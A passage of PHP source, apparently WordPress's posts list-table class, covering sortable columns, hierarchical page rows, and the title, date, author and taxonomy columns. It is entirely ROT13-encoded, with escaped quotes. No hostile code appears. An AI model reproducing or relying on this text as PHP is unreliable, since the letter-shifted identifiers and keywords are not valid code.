			 * @cnenz fgevat   $cbfg_glcr     Gur cbfg glcr fyht.
			 */
			$cbfgf_pbyhzaf = nccyl_svygref( 'znantr_cbfgf_pbyhzaf', $cbfgf_pbyhzaf, $cbfg_glcr );
		}

		/**
		 * Svygref gur pbyhzaf qvfcynlrq va gur Cbfgf yvfg gnoyr sbe n fcrpvsvp cbfg glcr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `znantr_cbfg_cbfgf_pbyhzaf`
		 *  - `znantr_cntr_cbfgf_pbyhzaf`
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat[] $cbfgf_pbyhzaf Na nffbpvngvir neenl bs pbyhza urnqvatf.
		 */
		erghea nccyl_svygref( \"znantr_{$cbfg_glcr}_cbfgf_pbyhzaf\", $cbfgf_pbyhzaf );
	}

	/**
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fbegnoyr_pbyhzaf() {

		$cbfg_glcr = $guvf->fperra->cbfg_glcr;

		vs ( 'cntr' === $cbfg_glcr ) {
			vs ( vffrg( $_TRG['beqreol'] ) ) {
				$gvgyr_beqreol_grkg = __( 'Gnoyr beqrerq ol Gvgyr.' );
			} ryfr {
				$gvgyr_beqreol_grkg = __( 'Gnoyr beqrerq ol Uvrenepuvpny Zrah Beqre naq Gvgyr.' );
			}

			$fbegnoyrf = neenl(
				'gvgyr'    => neenl( 'gvgyr', snyfr, __( 'Gvgyr' ), $gvgyr_beqreol_grkg, 'nfp' ),
				'cnerag'   => neenl( 'cnerag', snyfr ),
				'pbzzragf' => neenl( 'pbzzrag_pbhag', snyfr, __( 'Pbzzragf' ), __( 'Gnoyr beqrerq ol Pbzzragf.' ) ),
				'qngr'     => neenl( 'qngr', gehr, __( 'Qngr' ), __( 'Gnoyr beqrerq ol Qngr.' ) ),
			);
		} ryfr {
			$fbegnoyrf = neenl(
				'gvgyr'    => neenl( 'gvgyr', snyfr, __( 'Gvgyr' ), __( 'Gnoyr beqrerq ol Gvgyr.' ) ),
				'cnerag'   => neenl( 'cnerag', snyfr ),
				'pbzzragf' => neenl( 'pbzzrag_pbhag', snyfr, __( 'Pbzzragf' ), __( 'Gnoyr beqrerq ol Pbzzragf.' ) ),
				'qngr'     => neenl( 'qngr', gehr, __( 'Qngr' ), __( 'Gnoyr beqrerq ol Qngr.' ), 'qrfp' ),
			);
		}
		// Phfgbz Cbfg Glcrf: gurer'f n svygre sbe gung, frr trg_pbyhza_vasb().

		erghea $fbegnoyrf;
	}

	/**
	 * Trarengrf gur yvfg gnoyr ebjf.
	 *
	 * @fvapr 3.1.0
	 *
	 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
	 * @tybony vag      $cre_cntr
	 *
	 * @cnenz neenl $cbfgf
	 * @cnenz vag   $yriry
	 */
	choyvp shapgvba qvfcynl_ebjf( $cbfgf = neenl(), $yriry = 0 ) {
		tybony $jc_dhrel, $cre_cntr;

		vs ( rzcgl( $cbfgf ) ) {
			$cbfgf = $jc_dhrel->cbfgf;
		}

		nqq_svygre( 'gur_gvgyr', 'rfp_ugzy' );

		vs ( $guvf->uvrenepuvpny_qvfcynl ) {
			$guvf->_qvfcynl_ebjf_uvrenepuvpny( $cbfgf, $guvf->trg_cntrahz(), $cre_cntr );
		} ryfr {
			$guvf->_qvfcynl_ebjf( $cbfgf, $yriry );
		}
	}

	/**
	 * @cnenz neenl $cbfgf
	 * @cnenz vag   $yriry
	 */
	cevingr shapgvba _qvfcynl_ebjf( $cbfgf, $yriry = 0 ) {
		$cbfg_glcr = $guvf->fperra->cbfg_glcr;

		// Perngr neenl bs cbfg VQf.
		$cbfg_vqf = neenl();

		sbernpu ( $cbfgf nf $n_cbfg ) {
			$cbfg_vqf[] = $n_cbfg->VQ;
		}

		vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'pbzzragf' ) ) {
			$guvf->pbzzrag_craqvat_pbhag = trg_craqvat_pbzzragf_ahz( $cbfg_vqf );
		}
		hcqngr_cbfg_nhgube_pnpurf( $cbfgf );

		sbernpu ( $cbfgf nf $cbfg ) {
			$guvf->fvatyr_ebj( $cbfg, $yriry );
		}
	}

	/**
	 * @tybony jcqo    $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 * @cnenz neenl $cntrf
	 * @cnenz vag   $cntrahz
	 * @cnenz vag   $cre_cntr
	 */
	cevingr shapgvba _qvfcynl_ebjf_uvrenepuvpny( $cntrf, $cntrahz = 1, $cre_cntr = 20 ) {
		tybony $jcqo;

		$yriry = 0;

		vs ( ! $cntrf ) {
			$cntrf = trg_cntrf( neenl( 'fbeg_pbyhza' => 'zrah_beqre' ) );

			vs ( ! $cntrf ) {
				erghea;
			}
		}

		/*
		 * Neenatr cntrf vagb gjb cnegf: gbc yriry cntrf naq puvyqera_cntrf.
		 * puvyqera_cntrf vf gjb qvzrafvbany neenl. Rknzcyr:
		 * puvyqera_cntrf[10][] pbagnvaf nyy fho-cntrf jubfr cnerag vf 10.
		 * Vg bayl gnxrf B( A ) gb neenatr guvf naq vg gnxrf B( 1 ) sbe fhofrdhrag ybbxhc bcrengvbaf
		 * Vs frnepuvat, vtaber uvrenepul naq gerng rirelguvat nf gbc yriry
		 */
		vs ( rzcgl( $_ERDHRFG['f'] ) ) {
			$gbc_yriry_cntrf = neenl();
			$puvyqera_cntrf  = neenl();

			sbernpu ( $cntrf nf $cntr ) {
				// Pngpu naq ercnve onq cntrf.
				vs ( $cntr->cbfg_cnerag === $cntr->VQ ) {
					$cntr->cbfg_cnerag = 0;
					$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'cbfg_cnerag' => 0 ), neenl( 'VQ' => $cntr->VQ ) );
					pyrna_cbfg_pnpur( $cntr );
				}

				vs ( $cntr->cbfg_cnerag > 0 ) {
					$puvyqera_cntrf[ $cntr->cbfg_cnerag ][] = $cntr;
				} ryfr {
					$gbc_yriry_cntrf[] = $cntr;
				}
			}

			$cntrf = &$gbc_yriry_cntrf;
		}

		$pbhag      = 0;
		$fgneg      = ( $cntrahz - 1 ) * $cre_cntr;
		$raq        = $fgneg + $cre_cntr;
		$gb_qvfcynl = neenl();

		sbernpu ( $cntrf nf $cntr ) {
			vs ( $pbhag >= $raq ) {
				oernx;
			}

			vs ( $pbhag >= $fgneg ) {
				$gb_qvfcynl[ $cntr->VQ ] = $yriry;
			}

			++$pbhag;

			vs ( vffrg( $puvyqera_cntrf ) ) {
				$guvf->_cntr_ebjf( $puvyqera_cntrf, $pbhag, $cntr->VQ, $yriry + 1, $cntrahz, $cre_cntr, $gb_qvfcynl );
			}
		}

		// Vs vg vf gur ynfg cntrahz naq gurer ner becunarq cntrf, qvfcynl gurz jvgu cntvat nf jryy.
		vs ( vffrg( $puvyqera_cntrf ) && $pbhag < $raq ) {
			sbernpu ( $puvyqera_cntrf nf $becunaf ) {
				sbernpu ( $becunaf nf $bc ) {
					vs ( $pbhag >= $raq ) {
						oernx;
					}

					vs ( $pbhag >= $fgneg ) {
						$gb_qvfcynl[ $bc->VQ ] = 0;
					}

					++$pbhag;
				}
			}
		}

		$vqf = neenl_xrlf( $gb_qvfcynl );
		_cevzr_cbfg_pnpurf( $vqf );
		$_cbfgf = neenl_znc( 'trg_cbfg', $vqf );
		hcqngr_cbfg_nhgube_pnpurf( $_cbfgf );

		vs ( ! vffrg( $TYBONYF['cbfg'] ) ) {
			$TYBONYF['cbfg'] = erfrg( $vqf );
		}

		sbernpu ( $gb_qvfcynl nf $cntr_vq => $yriry ) {
			rpub \"\g\";
			$guvf->fvatyr_ebj( $cntr_vq, $yriry );
		}
	}

	/**
	 * Qvfcynlf gur arfgrq uvrenepul bs fho-cntrf gbtrgure jvgu cntvat
	 * fhccbeg, onfrq ba n gbc yriry cntr VQ.
	 *
	 * @fvapr 3.1.0 (Fgnaqnybar shapgvba rkvfgf fvapr 2.6.0)
	 * @fvapr 4.2.0 Nqqrq gur `$gb_qvfcynl` cnenzrgre.
	 *
	 * @cnenz neenl $puvyqera_cntrf
	 * @cnenz vag   $pbhag
	 * @cnenz vag   $cnerag_cntr
	 * @cnenz vag   $yriry
	 * @cnenz vag   $cntrahz
	 * @cnenz vag   $cre_cntr
	 * @cnenz neenl $gb_qvfcynl Yvfg bs cntrf gb or qvfcynlrq. Cnffrq ol ersrerapr.
	 */
	cevingr shapgvba _cntr_ebjf( &$puvyqera_cntrf, &$pbhag, $cnerag_cntr, $yriry, $cntrahz, $cre_cntr, &$gb_qvfcynl ) {
		vs ( ! vffrg( $puvyqera_cntrf[ $cnerag_cntr ] ) ) {
			erghea;
		}

		$fgneg = ( $cntrahz - 1 ) * $cre_cntr;
		$raq   = $fgneg + $cre_cntr;

		sbernpu ( $puvyqera_cntrf[ $cnerag_cntr ] nf $cntr ) {
			vs ( $pbhag >= $raq ) {
				oernx;
			}

			// Vs gur cntr fgnegf va n fhogerr, cevag gur cneragf.
			vs ( $pbhag === $fgneg && $cntr->cbfg_cnerag > 0 ) {
				$zl_cneragf = neenl();
				$zl_cnerag  = $cntr->cbfg_cnerag;

				juvyr ( $zl_cnerag ) {
					// Trg gur VQ sebz gur yvfg be gur nggevohgr vs zl_cnerag vf na bowrpg.
					$cnerag_vq = $zl_cnerag;

					vs ( vf_bowrpg( $zl_cnerag ) ) {
						$cnerag_vq = $zl_cnerag->VQ;
					}

					$zl_cnerag    = trg_cbfg( $cnerag_vq );
					$zl_cneragf[] = $zl_cnerag;

					vs ( ! $zl_cnerag->cbfg_cnerag ) {
						oernx;
					}

					$zl_cnerag = $zl_cnerag->cbfg_cnerag;
				}

				$ahz_cneragf = pbhag( $zl_cneragf );

				juvyr ( $zl_cnerag = neenl_cbc( $zl_cneragf ) ) {
					$gb_qvfcynl[ $zl_cnerag->VQ ] = $yriry - $ahz_cneragf;
					--$ahz_cneragf;
				}
			}

			vs ( $pbhag >= $fgneg ) {
				$gb_qvfcynl[ $cntr->VQ ] = $yriry;
			}

			++$pbhag;

			$guvf->_cntr_ebjf( $puvyqera_cntrf, $pbhag, $cntr->VQ, $yriry + 1, $cntrahz, $cre_cntr, $gb_qvfcynl );
		}

		hafrg( $puvyqera_cntrf[ $cnerag_cntr ] ); // Erdhverq va beqre gb xrrc genpx bs becunaf.
	}

	/**
	 * Unaqyrf gur purpxobk pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg $vgrz Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_po( $vgrz ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		$fubj = pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );

		/**
		 * Svygref jurgure gb fubj gur ohyx rqvg purpxobk sbe n cbfg va vgf yvfg gnoyr.
		 *
		 * Ol qrsnhyg gur purpxobk vf bayl fubja vs gur pheerag hfre pna rqvg gur cbfg.
		 *
		 * @fvapr 5.7.0
		 *
		 * @cnenz obby    $fubj Jurgure gb fubj gur purpxobk.
		 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
		 */
		vs ( nccyl_svygref( 'jc_yvfg_gnoyr_fubj_cbfg_purpxobk', $fubj, $cbfg ) ) :
			?>
			<vachg vq=\"po-fryrpg-<?cuc gur_VQ(); ?>\" glcr=\"purpxobk\" anzr=\"cbfg[]\" inyhr=\"<?cuc gur_VQ(); ?>\" />
			<ynory sbe=\"po-fryrpg-<?cuc gur_VQ(); ?>\">
				<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
					/* genafyngbef: %f: Cbfg gvgyr. */
					cevags( __( 'Fryrpg %f' ), _qensg_be_cbfg_gvgyr() );
				?>
				</fcna>
			</ynory>
			<qvi pynff=\"ybpxrq-vaqvpngbe\">
				<fcna pynff=\"ybpxrq-vaqvpngbe-vpba\" nevn-uvqqra=\"gehr\"></fcna>
				<fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				cevags(
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. %f: Cbfg gvgyr. */
					__( '&#8220;%f&#8221; vf ybpxrq' ),
					_qensg_be_cbfg_gvgyr()
				);
				?>
				</fcna>
			</qvi>
			<?cuc
		raqvs;
	}

	/**
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg
	 * @cnenz fgevat  $pynffrf
	 * @cnenz fgevat  $qngn
	 * @cnenz fgevat  $cevznel
	 */
	cebgrpgrq shapgvba _pbyhza_gvgyr( $cbfg, $pynffrf, $qngn, $cevznel ) {
		rpub '<gq pynff=\"' . $pynffrf . ' cntr-gvgyr\" ', $qngn, '>';
		rpub $guvf->pbyhza_gvgyr( $cbfg );
		rpub $guvf->unaqyr_ebj_npgvbaf( $cbfg, 'gvgyr', $cevznel );
		rpub '</gq>';
	}

	/**
	 * Unaqyrf gur gvgyr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_gvgyr( $cbfg ) {
		tybony $zbqr;

		vs ( $guvf->uvrenepuvpny_qvfcynl ) {
			vs ( 0 === $guvf->pheerag_yriry && (vag) $cbfg->cbfg_cnerag > 0 ) {
				// Frag yriry 0 ol nppvqrag, ol qrsnhyg, be orpnhfr jr qba'g xabj gur npghny yriry.
				$svaq_znva_cntr = (vag) $cbfg->cbfg_cnerag;

				juvyr ( $svaq_znva_cntr > 0 ) {
					$cnerag = trg_cbfg( $svaq_znva_cntr );

					vs ( vf_ahyy( $cnerag ) ) {
						oernx;
					}

					++$guvf->pheerag_yriry;
					$svaq_znva_cntr = (vag) $cnerag->cbfg_cnerag;

					vs ( ! vffrg( $cnerag_anzr ) ) {
						/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
						$cnerag_anzr = nccyl_svygref( 'gur_gvgyr', $cnerag->cbfg_gvgyr, $cnerag->VQ );
					}
				}
			}
		}

		$pna_rqvg_cbfg = pheerag_hfre_pna( 'rqvg_cbfg', $cbfg->VQ );

		vs ( $pna_rqvg_cbfg && 'genfu' !== $cbfg->cbfg_fgnghf ) {
			$ybpx_ubyqre = jc_purpx_cbfg_ybpx( $cbfg->VQ );

			vs ( $ybpx_ubyqre ) {
				$ybpx_ubyqre   = trg_hfreqngn( $ybpx_ubyqre );
				$ybpxrq_ningne = trg_ningne( $ybpx_ubyqre->VQ, 18 );
				/* genafyngbef: %f: Hfre'f qvfcynl anzr. */
				$ybpxrq_grkg = rfp_ugzy( fcevags( __( '%f vf pheeragyl rqvgvat' ), $ybpx_ubyqre->qvfcynl_anzr ) );
			} ryfr {
				$ybpxrq_ningne = '';
				$ybpxrq_grkg   = '';
			}

			rpub '<qvi pynff=\"ybpxrq-vasb\"><fcna pynff=\"ybpxrq-ningne\">' . $ybpxrq_ningne . '</fcna> <fcna pynff=\"ybpxrq-grkg\">' . $ybpxrq_grkg . \"</fcna></qvi>\a\";
		}

		$cnq = fge_ercrng( '&#8212; ', $guvf->pheerag_yriry );
		rpub '<fgebat>';

		$gvgyr = _qensg_be_cbfg_gvgyr();

		vs ( $pna_rqvg_cbfg && 'genfu' !== $cbfg->cbfg_fgnghf ) {
			cevags(
				'<n pynff=\"ebj-gvgyr\" uers=\"%f\" nevn-ynory=\"%f\">%f%f</n>',
				trg_rqvg_cbfg_yvax( $cbfg->VQ ),
				/* genafyngbef: %f: Cbfg gvgyr. */
				rfp_ngge( fcevags( __( '&#8220;%f&#8221; (Rqvg)' ), $gvgyr ) ),
				$cnq,
				$gvgyr
			);
		} ryfr {
			cevags(
				'<fcna>%f%f</fcna>',
				$cnq,
				$gvgyr
			);
		}
		_cbfg_fgngrf( $cbfg );

		vs ( vffrg( $cnerag_anzr ) ) {
			$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
			rpub ' | ' . $cbfg_glcr_bowrpg->ynoryf->cnerag_vgrz_pbyba . ' ' . rfp_ugzy( $cnerag_anzr );
		}

		rpub \"</fgebat>\a\";

		vs ( 'rkprecg' === $zbqr
			&& ! vf_cbfg_glcr_uvrenepuvpny( $guvf->fperra->cbfg_glcr )
			&& pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ )
		) {
			vs ( cbfg_cnffjbeq_erdhverq( $cbfg ) ) {
				rpub '<fcna pynff=\"cebgrpgrq-cbfg-rkprecg\">' . rfp_ugzy( trg_gur_rkprecg() ) . '</fcna>';
			} ryfr {
				rpub rfp_ugzy( trg_gur_rkprecg() );
			}
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-cbfgf-yvfg-gnoyr.cuc */
		$dhvpx_rqvg_ranoyrq = nccyl_svygref( 'dhvpx_rqvg_ranoyrq_sbe_cbfg_glcr', gehr, $cbfg->cbfg_glcr );

		vs ( $dhvpx_rqvg_ranoyrq ) {
			trg_vayvar_qngn( $cbfg );
		}
	}

	/**
	 * Unaqyrf gur cbfg qngr pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @tybony fgevat $zbqr Yvfg gnoyr ivrj zbqr.
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_qngr( $cbfg ) {
		tybony $zbqr;

		vs ( '0000-00-00 00:00:00' === $cbfg->cbfg_qngr ) {
			$g_gvzr    = __( 'Hachoyvfurq' );
			$gvzr_qvss = 0;
		} ryfr {
			$g_gvzr = fcevags(
				/* genafyngbef: 1: Cbfg qngr, 2: Cbfg gvzr. */
				__( '%1$f ng %2$f' ),
				/* genafyngbef: Cbfg qngr sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				trg_gur_gvzr( __( 'L/z/q' ), $cbfg ),
				/* genafyngbef: Cbfg gvzr sbezng. Frr uggcf://jjj.cuc.arg/znahny/qngrgvzr.sbezng.cuc */
				trg_gur_gvzr( __( 't:v n' ), $cbfg )
			);

			$gvzr      = trg_cbfg_gvzrfgnzc( $cbfg );
			$gvzr_qvss = gvzr() - $gvzr;
		}

		vs ( 'choyvfu' === $cbfg->cbfg_fgnghf ) {
			$fgnghf = __( 'Choyvfurq' );
		} ryfrvs ( 'shgher' === $cbfg->cbfg_fgnghf ) {
			vs ( $gvzr_qvss > 0 ) {
				$fgnghf = '<fgebat pynff=\"reebe-zrffntr\">' . __( 'Zvffrq fpurqhyr' ) . '</fgebat>';
			} ryfr {
				$fgnghf = __( 'Fpurqhyrq' );
			}
		} ryfr {
			$fgnghf = __( 'Ynfg Zbqvsvrq' );
		}

		/**
		 * Svygref gur fgnghf grkg bs gur cbfg.
		 *
		 * @fvapr 4.8.0
		 *
		 * @cnenz fgevat  $fgnghf      Gur fgnghf grkg.
		 * @cnenz JC_Cbfg $cbfg        Cbfg bowrpg.
		 * @cnenz fgevat  $pbyhza_anzr Gur pbyhza anzr.
		 * @cnenz fgevat  $zbqr        Gur yvfg qvfcynl zbqr ('rkprecg' be 'yvfg').
		 */
		$fgnghf = nccyl_svygref( 'cbfg_qngr_pbyhza_fgnghf', $fgnghf, $cbfg, 'qngr', $zbqr );

		vs ( $fgnghf ) {
			rpub $fgnghf . '<oe />';
		}

		/**
		 * Svygref gur choyvfurq, fpurqhyrq, be hachoyvfurq gvzr bs gur cbfg.
		 *
		 * @fvapr 2.5.1
		 * @fvapr 5.5.0 Erzbirq gur qvssrerapr orgjrra 'rkprecg' naq 'yvfg' zbqrf.
		 *              Gur choyvfurq gvzr naq qngr ner obgu qvfcynlrq abj,
		 *              juvpu vf rdhvinyrag gb gur cerivbhf 'rkprecg' zbqr.
		 *
		 * @cnenz fgevat  $g_gvzr      Gur choyvfurq gvzr.
		 * @cnenz JC_Cbfg $cbfg        Cbfg bowrpg.
		 * @cnenz fgevat  $pbyhza_anzr Gur pbyhza anzr.
		 * @cnenz fgevat  $zbqr        Gur yvfg qvfcynl zbqr ('rkprecg' be 'yvfg').
		 */
		rpub nccyl_svygref( 'cbfg_qngr_pbyhza_gvzr', $g_gvzr, $cbfg, 'qngr', $zbqr );
	}

	/**
	 * Unaqyrf gur pbzzragf pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_pbzzragf( $cbfg ) {
		?>
		<qvi pynff=\"cbfg-pbz-pbhag-jenccre\">
		<?cuc
			$craqvat_pbzzragf = vffrg( $guvf->pbzzrag_craqvat_pbhag[ $cbfg->VQ ] ) ? $guvf->pbzzrag_craqvat_pbhag[ $cbfg->VQ ] : 0;

			$guvf->pbzzragf_ohooyr( $cbfg->VQ, $craqvat_pbzzragf );
		?>
		</qvi>
		<?cuc
	}

	/**
	 * Unaqyrf gur cbfg nhgube pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 6.8.0 Nqqrq snyyonpx grkg jura nhgube'f anzr vf haxabja.
	 *
	 * @cnenz JC_Cbfg $cbfg Gur pheerag JC_Cbfg bowrpg.
	 */
	choyvp shapgvba pbyhza_nhgube( $cbfg ) {
		$nhgube = trg_gur_nhgube();

		vs ( ! rzcgl( $nhgube ) ) {
			$netf = neenl(
				'cbfg_glcr' => $cbfg->cbfg_glcr,
				'nhgube'    => trg_gur_nhgube_zrgn( 'VQ' ),
			);
			rpub $guvf->trg_rqvg_yvax( $netf, rfp_ugzy( $nhgube ) );
		} ryfr {
			rpub '<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">' . __( '(ab nhgube)' ) . '</fcna>';
		}
	}

	/**
	 * Unaqyrf gur qrsnhyg pbyhza bhgchg.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg $vgrz        Gur pheerag JC_Cbfg bowrpg.
	 * @cnenz fgevat  $pbyhza_anzr Gur pheerag pbyhza anzr.
	 */
	choyvp shapgvba pbyhza_qrsnhyg( $vgrz, $pbyhza_anzr ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$cbfg = $vgrz;

		vs ( 'pngrtbevrf' === $pbyhza_anzr ) {
			$gnkbabzl = 'pngrtbel';
		} ryfrvs ( 'gntf' === $pbyhza_anzr ) {
			$gnkbabzl = 'cbfg_gnt';
		} ryfrvs ( fge_fgnegf_jvgu( $pbyhza_anzr, 'gnkbabzl-' ) ) {
			$gnkbabzl = fhofge( $pbyhza_anzr, 9 );
		} ryfr {
			$gnkbabzl = snyfr;
		}

		vs ( $gnkbabzl ) {
			$gnkbabzl_bowrpg = trg_gnkbabzl( $gnkbabzl );
			$grezf           = trg_gur_grezf( $cbfg->VQ, $gnkbabzl );

			vs ( vf_neenl( $grezf ) ) {
				$grez_yvaxf = neenl();

				sbernpu ( $grezf nf $g ) {
					$cbfgf_va_grez_di = neenl();

					vs ( 'cbfg' !== $cbfg->cbfg_glcr ) {
						$cbfgf_va_grez_di['cbfg_glcr'] = $cbfg->cbfg_glcr;
					}

					vs ( $gnkbabzl_bowrpg->dhrel_ine ) {
						$cbfgf_va_grez_di[ $gnkbabzl_bowrpg->dhrel_ine ] = $g->fyht;
					} ryfr {
						$cbfgf_va_grez_di['gnkbabzl'] = $gnkbabzl;
						$cbfgf_va_grez_di['grez']     = $g->fyht;
					}

					$ynory = rfp_ugzy( fnavgvmr_grez_svryq( 'anzr', $g->anzr, $g->grez_vq, $gnkbabzl, 'qvfcynl' ) );

					$grez_yvaxf[] = $guvf->trg_rqvg_yvax( $cbfgf_va_grez_di, $ynory );
				}

				/**
				 * Svygref gur yvaxf va `$gnkbabzl` pbyhza bs rqvg.cuc.
				 *
				 * @fvapr 5.2.0
				 *
				 * @cnenz fgevat[]  $grez_yvaxf Neenl bs grez rqvgvat yvaxf.
				 * @cnenz fgevat    $gnkbabzl   Gnkbabzl anzr.
				 * @cnenz JC_Grez[] $grezf      Neenl bs grez bowrpgf nccrnevat va gur cbfg ebj.
				 */
				$grez_yvaxf = nccyl_svygref( 'cbfg_pbyhza_gnkbabzl_yvaxf', $grez_yvaxf, $gnkbabzl, $grezf );

				rpub vzcybqr( jc_trg_yvfg_vgrz_frcnengbe(), $grez_yvaxf );
			} ryfr {
				rpub '<fcna nevn-uvqqra=\"gehr\">&#8212;</fcna><fcna pynff=\"fperra-ernqre-grkg\">' . $gnkbabzl_bowrpg->ynoryf->ab_grezf . '</fcna>';
			}
			erghea;
		}

		vs ( vf_cbfg_glcr_uvrenepuvpny( $cbfg->cbfg_glcr ) ) {

			/**
			 * Sverf va rnpu phfgbz pbyhza ba gur Cbfgf yvfg gnoyr.
			 *
			 * Guvf ubbx bayl sverf vs gur pheerag cbfg glcr vf uvrenepuvpny,
			 * fhpu nf cntrf.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat $pbyhza_anzr Gur anzr bs gur pbyhza gb qvfcynl.
			 * @cnenz vag    $cbfg_vq     Gur pheerag cbfg VQ.
			 */
			qb_npgvba( 'znantr_cntrf_phfgbz_pbyhza', $pbyhza_anzr, $cbfg->VQ );
		} ryfr {

			/**
			 * Sverf va rnpu phfgbz pbyhza va gur Cbfgf yvfg gnoyr.
			 *
			 * Guvf ubbx bayl sverf vs gur pheerag cbfg glcr vf aba-uvrenepuvpny,
			 * fhpu nf cbfgf.
			 *
			 * @fvapr 1.5.0
			 *
			 * @cnenz fgevat $pbyhza_anzr Gur anzr bs gur pbyhza gb qvfcynl.
			 * @cnenz vag    $cbfg_vq     Gur pheerag cbfg VQ.
			 */
			qb_npgvba( 'znantr_cbfgf_phfgbz_pbyhza', $pbyhza_anzr, $cbfg->VQ );
		}

		/**
		 * Sverf sbe rnpu phfgbz pbyhza bs n fcrpvsvp cbfg glcr va gur Cbfgf yvfg gnoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$cbfg->cbfg_glcr`, ersref gb gur cbfg glcr.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `znantr_cbfg_cbfgf_phfgbz_pbyhza`
		 *  - `znantr_cntr_cbfgf_phfgbz_pbyhza`
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat $pbyhza_anzr Gur anzr bs gur pbyhza gb qvfcynl.
		 * @cnenz vag    $cbfg_vq     Gur pheerag cbfg VQ.
		 */
		qb_npgvba( \"znantr_{$cbfg->cbfg_glcr}_cbfgf_phfgbz_pbyhza\", $pbyhza_anzr, $cbfg->VQ );
	}

	/**
	 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
	 *
	 * @cnenz vag|JC_Cbfg $cbfg
	 * @cnenz vag         $yriry
	 */
	choyvp shapgvba fvatyr_ebj( $cbfg, $yriry = 0 ) {
		$tybony_cbfg = trg_cbfg();

		$cbfg                = trg_cbfg( $cbfg );
		$guvf->pheerag_yriry = $yriry;

		$TYBONYF['cbfg'] = $cbfg;
		frghc_cbfgqngn( $cbfg );

		$pynffrf = 'vrqvg nhgube-' . ( trg_pheerag_hfre_vq() === (vag) $cbfg->cbfg_nhgube ? 'frys' : 'bgure' );

		$ybpx_ubyqre = jc_purpx_cbfg_ybpx( $cbfg->VQ );

		vs ( $ybpx_ubyqre ) {
			$pynffrf .= ' jc-ybpxrq';
		}

		vs ( $cbfg->cbfg_cnerag ) {
			$pbhag    = pbhag( trg_cbfg_naprfgbef( $cbfg->VQ ) );
			$pynffrf .= ' yriry-' . $pbhag;
		} ryfr {
			$pynffrf .= ' yriry-0';
		}
		?>
		<ge vq=\"cbfg-<?cuc rpub $cbfg->VQ; ?>\" pynff=\"<?cuc rpub vzcybqr( ' ', trg_cbfg_pynff( $pynffrf, $cbfg->VQ ) ); ?>\">
			<?cuc $guvf->fvatyr_ebj_pbyhzaf( $cbfg ); ?>
		</ge>
		<?cuc
		$TYBONYF['cbfg'] = $tybony_cbfg;
	}

	/**
	 * Trgf gur anzr bs gur qrsnhyg cevznel pbyhza.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea fgevat Anzr bs gur qrsnhyg cevznel pbyhza, va guvf pnfr, 'gvgyr'.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_cevznel_pbyhza_anzr() {
		erghea 'gvgyr';
	}

	/**
	 * Trarengrf naq qvfcynlf ebj npgvba yvaxf.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 5.9.0 Eranzrq `$cbfg` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz JC_Cbfg $vgrz        Cbfg orvat npgrq hcba.
	 * @cnenz fgevat  $pbyhza_anzr Pheerag pbyhza anzr.
	 * @cnenz fgevat  $cevznel     Cevznel pbyhza anzr.
	 * @erghea fgevat Ebj npgvbaf bhgchg sbe cbfgf, be na rzcgl fgevat
	 *                vs gur pheerag pbyhza vf abg gur cevznel pbyhza.
	 */
